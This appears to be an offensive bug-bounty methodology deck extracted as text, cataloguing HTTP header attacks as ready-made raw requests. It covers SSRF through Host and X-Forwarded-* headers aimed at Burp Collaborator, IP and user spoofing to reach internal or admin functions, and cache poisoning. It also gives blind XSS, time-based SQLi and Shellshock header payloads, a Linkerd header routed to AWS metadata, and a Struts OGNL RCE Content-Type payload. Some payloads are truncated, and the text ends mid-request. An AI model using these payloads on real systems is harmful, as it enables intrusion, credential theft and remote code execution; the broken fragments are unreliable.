attacker
My Methodology
●
             Resource
Try To Override The Host Header e.g. POST https://company.com AND Change
Host Header e.g Host: RandomString(10).id.burpcollaborator.net To Get SSRF
GET https://company.com/Endpoint-To-Proxy HTTP/1.1
Host: RandomString(10).id.burpcollaborator.net
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
Connection: keep-alive
attacker
My Methodology
●
             Video
●
             Video
●
             Writeup
Try To Spoof The Original IP By Appending X-Forwarded-For Header e.g.
X-Forwarded-For: 0000::1 To Expose Internal Information
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
X-Forwarded-For: 0000::1
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Writeup
Try To Spoof The Original IP By Appending X-Forwarded-For Header With
Change HTTP/1.1 To HTTP/1.0 To Get SSRF
GET /Endpoint-To-Proxy HTTP/1.0
Host: www.company.com
X-Forwarded-For: RandomString(10).id.burpcollaborator.net
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Tweet
Try To Spoof The Original IP By Appending X-Forwarded-For Header With Encoded 
IP Addresses e.g. X-Forwarded-For: 0177.1 To Expose Internal Information
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
X-Forwarded-For: 0177.1
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Tweet
Try To Use X-Forwarded-For Header e.g. X-Forwarded-For: 127.0.0.1\r To
Expose Internal Information
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
X-Forwarded-For: 127.0.0.1\r
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Slides
Try To Use X_Forwarded_For Header Instead Of  X-Forwarded-For e.g. 
X_Forwarded_For: 127.0.0.1 To Expose Internal Information
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
X_Forwarded_For: 127.0.0.1
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Blog
Try To Use Forwarded Header e.g. Forwarded: for=127.0.0.1 , Forwarded: 
for=IPv4;proto=http;by=IPv4 OR  Forwarded: for="[::1]:Port" To Bypass It
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Forwarded: for=127.0.0.1
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Blog
Try To Spoof The Original IP By Appending X-ProxyUser-Ip Header e.g. 
X-ProxyUser-Ip: 127.0.0.1 To Expose Internal Information
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
X-ProxyUser-Ip: 127.0.0.1
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Blog
Try To Spoof The Original User By Appending X-Remote-User Header e.g. 
X-Remote-User: admin To Expose Internal Information
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
X-Remote-User: admin
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Blog
Try To Inject Standard Headers e.g. Referer , Origin etc , To Get SSRF
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Referer: RandomString(10).id.burpcollaborator.net
Origin: https://RandomString(10).id.burpcollaborator.net
Connection: keep-alive
attacker
My Methodology
●
             Slides
Try To Inject Double Standard Headers e.g. Referer , Origin etc , To Get SSRF
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Referer: RandomString(10).id.burpcollaborator.net
Referer: RandomString(10).id.burpcollaborator.net
Origin: https://RandomString(10).id.burpcollaborator.net
Origin: https://RandomString(10).id.burpcollaborator.net
Connection: keep-alive
attacker
My Methodology
●
             Slides
Try To Inject Noun-Standard Headers e.g. X-Forwarded-For , X-Forwarded-Host ,
X-Client-IP , True- Client- IP AND X-Originating-IP etc , To Get SSRF
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
X-Forwarded-For: RandomString(10).id.burpcollaborator.net
X-Forwarded-Host: RandomString(10).id.burpcollaborator.net
X-Client-IP: RandomString(10).id.burpcollaborator.net
X-Originating-IP: RandomString(10).id.burpcollaborator.net
X -WAP -Profile: https://RandomString(10).id.burpcollaborator.net
True- Client- IP: RandomString(10).id.burpcollaborator.net
Connection: keep-alive
attacker
My Methodology
●
             Slides
●
             Video
●
             Blog
Try To Inject Double Noun-Standard Headers e.g. X-Forwarded-For , X-Client-IP , 
X-Forwarded-Host , True- Client- IP AND X-Originating-IP etc , To Get SSRF
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
X-Forwarded-For: RandomString(10).id.burpcollaborator.net
X-Forwarded-For: RandomString(10).id.burpcollaborator.net
X-Forwarded-Host: RandomString(10).id.burpcollaborator.net
X-Forwarded-Host: RandomString(10).id.burpcollaborator.net
X-Client-IP: RandomString(10).id.burpcollaborator.net
X-Client-IP: RandomString(10).id.burpcollaborator.net
Connection: keep-alive
attacker
My Methodology
●
             Resource
attacker
My Methodology
Try To Inject Blind XSS e.g. "> OR Time-Based
SQLi e.g. ";WAITFOR DELAY '0.0.20'-- In X-Forwarded-For Header
●
             Tweet
●
             Blog
Try To Inject Blind XSS e.g. "> OR Time-Based
SQLi e.g. 'XOR(if(now()=sysdate(),sleep(30),0))OR' In User-Agent Header
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0'XOR(if(now()=sysdate(),sleep(30),0))OR'
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Writeup
●
             Tweet
Try To Inject e.g. { :;}; echo $( In Referer Header
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Referer: ">
Origin: https://www.company.com
attacker
My Methodology
●
             Writeup
Try To Inject Double Content-Type Header e.g. Content-Type: multipart/form-data
Content-Type: application/json To Expose Internal Information
POST /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Content-Type: multipart/form-data
Content-Type: application/json
Content-Length: Number
Origin: https://www.company.com
parameter=value
attacker
My Methodology
●
             Resource
Try To Inject Invalid Content-Type Header e.g. Content-Type: */* To
Expose Internal Information
POST /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Content-Type: */*
Content-Length: Number
Origin: https://www.company.com
parameter=value
attacker
My Methodology
●
             Tweet
If There Is Linkerd Service Try To Inject l5d-dtab Header e.g.
l5d-dtab: /$/inet/169.254.169.254/80 To Get AWS metadata
POST /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
l5d-dtab: /$/inet/169.254.169.254/80
Content-Length: Number
Origin: https://www.company.com
parameter=value
attacker
My Methodology
●
             Tweet
Try To Inject Payloads In Content-Type Header e.g. Content-Type: %{#context['com.opensymphony
.xwork2.dispatcher.HttpServletResponse'].addHeader(Header,4*4)}.multipart/form-data To Get RCE
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Content-Type: %{#context['com.opensymphony.xwork2
.dispatcher.HttpServletResponse'].addHeader(Header,4*4)}.multip
art/form-data
Origin: https://www.company.com
attacker
My Methodology
●
             Writeup
●
             Writeup
●
             Writeup
●
             Tweet
Try To Inject Content-Length Header With Number And There Is Not Body Content To 
Expose Internal Information
POST /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Content-Type: application/json
Content-Length: Number
Origin: https://www.company.com
attacker
My Methodology
●
             Resource
Try To Ambiguate The Host Header e.g. Host: company.com:PORT To
Achieve Cache Poisoning
GET /Endpoint-To-Proxy HTTP/1.1
Host: company.com:PORT
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
Connection: keep-alive
attacker
My Methodology
●
             Video
Try To Add Another Space-surrounded Host Header e.g.  
Host:RandomString(10).id.burpcollaborator.net To Achieve Cache Poisoning
GET /Endpoint-To-Proxy HTTP/1.1
Host: company.com
User-Agent: Mozilla/5.0
 Host: RandomString(10).id.burpcollaborator.net
Referer: https://previous.com/path
Origin: https://www.company.com
Connection: keep-alive
attacker
My Methodology
●
             Video
Try To Add Another Space-surrounded Host Header e.g.  
Host:RandomString(10).id.burpcollaborator.net To Achieve Cache Poisoning
GET /Endpoint-To-Proxy HTTP/1.1
User-Agent: Mozilla/5.0
 Host: RandomString(10).id.burpcollaborator.net
Host: company.com
Referer: https://previous.com/path
Origin: https://www.company.com
Connection: keep-alive
attacker
My Methodology
●
             Video
Try To Inject X-Forwarded-Host e.g. X-Forwarded-Host: 
RandomString(10).id.burpcollaborator.net To Achieve Cache Poisoning OR XSS
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
X-Forwarded-Host: RandomString(10).id.burpcollaborator.net
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Video
●
             Writeup
Try To Inject X-Forwarded-Host e.g. X-Forwarded-Host: www.company.com:PORT
To Achieve Cache Poisoning OR XSS
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
X-Forwarded-Host: www.company.com:PORT
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Blog
Try To Inject Double X-Forwarded-Host e.g. X-Forwarded-Host: company.com And 
X-Forwarded-Host: RandomString(10).id.burpcollaborator.net To Achieve Cache 
Poisoning
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
X-Forwarded-Host: www.company.com
X-Forwarded-Host: RandomString(10).id.burpcollaborator.net
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Blog
Try To Inject X-Forwarded-Server e.g. X-Forwarded-Server: 
RandomString(10).id.burpcollaborator.net To Achieve Cache Poisoning OR XSS
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
X-Forwarded-Server: RandomString(10).id.burpcollaborator.net
Referer: https://previous.com/path
Origin: https://www.company.com
attacker
My Methodology
●
             Video
Try To Inject X-Forwarded-Host And Origin e.g. Origin: null And X-Forwarded-Host: 
RandomString(10).id.burpcollaborator.net To Achieve Cache Poisoning OR XSS
GET /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Origin: null
X-Forwarded-Host: RandomString(10).id.burpcollaborator.net
Referer: https://previous.com/path
attacker
My Methodology
●
             Video
Try To Inject Origin Header e.g. Origin: '-alert(1)-' To Achieve Cache Poisoning OR 
XSS
GET /Endpoint-To-Proxy HTTP/1.1